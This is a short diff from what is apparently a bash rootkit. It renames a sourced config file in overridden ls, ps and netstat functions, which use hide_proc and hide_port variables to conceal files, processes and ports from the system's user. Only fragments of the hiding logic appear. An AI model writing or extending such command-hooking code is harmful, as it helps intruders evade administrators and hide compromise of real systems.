@@ -296,7 +296,7 @@ function ls()
 
 	max_col_num=`stty size|cut -d " " -f 2`
 
-        . $BR_ROOTKIT_PATH/br_config.sh
+        . $BR_ROOTKIT_PATH/brconfig.sh
         br_load_config $BR_ROOTKIT_PATH/br.conf
 
 	for file_arg in $@
@@ -392,7 +392,7 @@ function ps()
 {
         local proc_name hide_proc old_ifs
 
-        . $BR_ROOTKIT_PATH/br_config.sh
+        . $BR_ROOTKIT_PATH/brconfig.sh
         br_load_config $BR_ROOTKIT_PATH/br.conf
 
         old_ifs=$IFS; IFS=","
@@ -428,7 +428,7 @@ function netstat()
 {
         local hide_port tmp_port old_ifs
 
-	. $BR_ROOTKIT_PATH/br_config.sh
+	. $BR_ROOTKIT_PATH/brconfig.sh
 	br_load_config $BR_ROOTKIT_PATH/br.conf
 
 	old_ifs=$IFS; IFS=","
